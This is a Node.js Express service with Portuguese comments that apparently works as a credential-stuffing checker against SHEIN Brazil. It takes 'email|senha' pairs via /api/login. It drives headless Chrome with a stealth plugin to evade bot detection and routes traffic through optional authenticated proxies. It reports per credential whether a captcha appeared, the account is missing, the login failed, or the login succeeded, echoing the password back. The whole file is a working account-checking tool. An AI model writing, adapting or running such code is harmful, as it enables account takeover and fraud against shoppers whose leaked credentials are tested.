const fs = require("fs-extra");
const express = require("express");
const puppeteerExtra = require("puppeteer-extra");
const StealthPlugin = require("puppeteer-extra-plugin-stealth");
puppeteerExtra.use(StealthPlugin());

const app = express();
const PORT = process.env.PORT || 3000;

app.get("/api/login", async (req, res) => {
  let browser;
  try {
    const { lista, proxy_host, proxy_port, proxy_user, proxy_pass } = req.query;

    if (!lista || !lista.includes("|")) {
      return res.status(400).json({
        success: false,
        error: "Formato inválido! Use /api/login?lista=email|senha",
      });
    }

    const [email, senha] = lista.split("|");

    let proxyHost, proxyPort, proxyUser, proxyPass;
    let useProxy = false;
    let useAuth = false;

    if (proxy_host && proxy_port) {
      useProxy = true;
      proxyHost = proxy_host;
      proxyPort = proxy_port;
      if (proxy_user && proxy_pass) {
        proxyUser = proxy_user;
        proxyPass = proxy_pass;
        useAuth = true;
      }
    }

    const puppeteerArgs = ["--no-sandbox", "--disable-setuid-sandbox"];
    if (useProxy)
      puppeteerArgs.push(`--proxy-server=${proxyHost}:${proxyPort}`);

    browser = await puppeteerExtra.launch({
      executablePath: "/usr/bin/google-chrome", // Caminho do Chrome no Docker
      headless: true,
      args: [
        "--no-sandbox",
        "--disable-setuid-sandbox",
        "--lang=pt-BR",
        useProxy ? `--proxy-server=${proxyHost}:${proxyPort}` : "",
      ].filter(Boolean),
    });

    const page = await browser.newPage();

    await page.setExtraHTTPHeaders({
      "Accept-Language": "pt-BR,pt;q=0.9",
    });

    if (useProxy && useAuth) {
      await page.authenticate({ username: proxyUser, password: proxyPass });
    }

    // CÓDIGO NOVO E CORRIGIDO
    await page.goto("https://br.shein.com/user/auth/login?direction=nav", {
      waitUntil: "load",
    });

    // Campo de email
    const emailSelector =
      "body > div.c-outermost-ctn.j-outermost-ctn > div.container-fluid-1200.j-login-container.she-v-cloak-none > div > div > div > div.page__login-top-style > div.page__login-newUI-continue > div.page__login_input-filed.page__login-newUI-input > div > div.input_filed-wrapper > div > div > input";

    await page.waitForFunction(
      (selector) => {
        const el = document.querySelector(selector);
        return el && el.offsetParent !== null;
      },
      { timeout: 60000 },
      emailSelector
    );
    await page.type(emailSelector, email, { delay: 100 });

    // Botão continuar
    const continueSelector =
      "body > div.c-outermost-ctn.j-outermost-ctn > div.container-fluid-1200.j-login-container.she-v-cloak-none > div > div > div > div.page__login-top-style > div.page__login-newUI-continue > div.actions > div > div > button";
    await page.click(continueSelector);

    await new Promise((resolve) => setTimeout(resolve, 5000));

    // Verifica captcha
    try {
      await page.waitForSelector(
        "body > div:nth-child(129) > div.geetest_panel_box.geetest_panelshowslide > div.geetest_panel_next > div > div.geetest_wrap > div.geetest_slider.geetest_ready > div.geetest_slider_button",
        { timeout: 4000 }
      );
      await browser.close();
      return res.json({
        success: false,
        status: "Captcha Detectado :(",
        email,
        proxy: useProxy
          ? `${proxyHost}:${proxyPort}${
              useAuth ? ` (auth: ${proxyUser})` : " (sem auth)"
            }`
          : "IP Local",
      });
    } catch {}

    await new Promise((resolve) => setTimeout(resolve, 2000));

    // Conta inexistente
    const seletorConta =
      "body > div.c-outermost-ctn.j-outermost-ctn > div.container-fluid-1200.j-login-container.she-v-cloak-none > div > div > div > div.page__login-top-style > div:nth-child(2) > div > div.sui-dialog__ctn.sui-animation__dialog_W480 > div > div.sui-dialog__body > div.page__login-newUI-emailPannel > h2 > p";

    const elementoConta = await page.$(seletorConta);
    if (elementoConta) {
      const texto = await page.evaluate((el) => el.textContent, elementoConta);
      if (texto.trim() === "Crie sua SHEIN conta.") {
        await browser.close();
        return res.json({
          success: false,
          status: "Conta não existe",
          email,
          proxy: useProxy
            ? `${proxyHost}:${proxyPort}${
                useAuth ? ` (auth: ${proxyUser})` : " (sem auth)"
              }`
            : "IP Local",
        });
      }
    }

    // Campo senha
    const passwordSelector =
      "body > div.c-outermost-ctn.j-outermost-ctn > div.container-fluid-1200.j-login-container.she-v-cloak-none > div > div > div > div.page__login-top-style > div:nth-child(2) > div > div.sui-dialog__ctn.sui-animation__dialog_W480 > div > div.sui-dialog__body > div.page__login-newUI-emailPannel > div.main-content > div:nth-child(2) > div > div > input";
    await page.waitForSelector(passwordSelector, {
      visible: true,
      timeout: 60000,
    });
    await page.type(passwordSelector, senha, { delay: 10 });

    // Botão login
    const loginButtonSelector =
      "body > div.c-outermost-ctn.j-outermost-ctn > div.container-fluid-1200.j-login-container.she-v-cloak-none > div > div > div > div.page__login-top-style > div:nth-child(2) > div > div.sui-dialog__ctn.sui-animation__dialog_W480 > div > div.sui-dialog__body > div.page__login-newUI-emailPannel > div.main-content > div.actions > div > button > span";
    await page.click(loginButtonSelector);

    await new Promise((resolve) => setTimeout(resolve, 9000));

    const errorSelector =
      "body > div.c-outermost-ctn.j-outermost-ctn > div.container-fluid-1200.j-login-container.she-v-cloak-none > div > div > div > div.page__login-top-style > div:nth-child(2) > div > div.sui-dialog__ctn.sui-animation__dialog_W480 > div > div.sui-dialog__body > div.page__login-newUI-emailPannel > div.main-content > div.page__login_input-filed.page__login-newUI-input.error > p";

    const elementoErro = await page.$(errorSelector);

    if (elementoErro) {
      const textoErro = await page.evaluate(
        (el) => el.textContent,
        elementoErro
      );
      if (
        textoErro.includes(
          "O Endereço de Email ou Senha que você digitou está incorreto"
        )
      ) {
        await browser.close();
        return res.json({
          success: false,
          status: "Login inválido",
          email,
          senha,
          proxy: useProxy
            ? `${proxyHost}:${proxyPort}${
                useAuth ? ` (auth: ${proxyUser})` : " (sem auth)"
              }`
            : "IP Local",
        });
      }
    }

    // Se não houver erro
    await browser.close();
    return res.json({
      success: true,
      status: "Login efetuado",
      email,
      senha,
      proxy: useProxy
        ? `${proxyHost}:${proxyPort}${
            useAuth ? ` (auth: ${proxyUser})` : " (sem auth)"
          }`
        : "IP Local",
    });
  } catch (error) {
    if (browser) await browser.close();
    return res.status(500).json({
      success: false,
      error: "Erro interno no servidor",
      details: error.message,
    });
  }
});

app.listen(PORT, () => {
  console.log(`Servidor rodando na porta ${PORT}`);
});




